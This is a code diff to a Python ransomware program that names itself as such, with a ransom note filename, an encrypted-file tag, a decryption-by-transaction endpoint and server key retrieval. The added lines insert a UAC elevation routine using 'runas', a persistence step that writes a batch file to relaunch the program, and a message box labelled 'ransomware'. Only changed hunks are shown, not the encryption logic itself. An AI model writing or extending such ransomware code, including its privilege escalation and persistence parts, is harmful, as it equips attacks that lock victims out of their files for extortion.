@@ -9,6 +9,8 @@ from fastapi import FastAPI
 import uvicorn
 import multiprocessing
 import winreg as reg   
+import sys
+
 
 EXPLANATION_FILENAME = 'YOUR_FILES_ENCRYPTED.txt'
 ENCRYPTED_FILE_TAG = 'ransom_encrypted'
@@ -40,7 +42,19 @@ async def attempt_decrypt(transaction_id: str):
 
 
 
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
 
+
+def check_if_admin():
+    if not is_admin():
+        print(" ".join(sys.argv))
+        params = " ".join(sys.argv)
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
+        sys.exit()
 
 # def iterate_all_files():
 #     # iterate over files in
@@ -191,7 +205,8 @@ def create_dir(path):
 
 
 async def main():
-    create_dir('./keys')
+    #check_if_admin()
+    create_dir('./keys/')
     await get_server_public_key("./keys/public.pem")
     rsa_cipher.setup()
 
@@ -205,10 +220,13 @@ async def main():
  
       
 def persistence():
-    with open('start.bat','w') as f:
-        f.write('timeout /t 15\n')
-        f.write(f'CD \"{str(os.getcwd())}\"\n')
-        f.write('python main.py\nexit')
+    try:
+        with open('start.bat','w') as f:
+            f.write('timeout /t 15\n')
+            f.write(f'chdir /d \"{str(os.getcwd())}\"\n')
+            f.write(f'python \"{str(os.getcwd())}\main.py\"\nexit')
+    except Exception as e:
+        print(e)
 
 
 
@@ -226,6 +244,8 @@ def main_helper():
     uvicorn.run("main:app", port=8074, host='127.0.0.1')
 
 if __name__ == "__main__":
+    
+    ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "ransomware", 1)
     #uvicorn.run(app, host="127.0.0.1", port=)
     set_watchdog()
     main_helper()
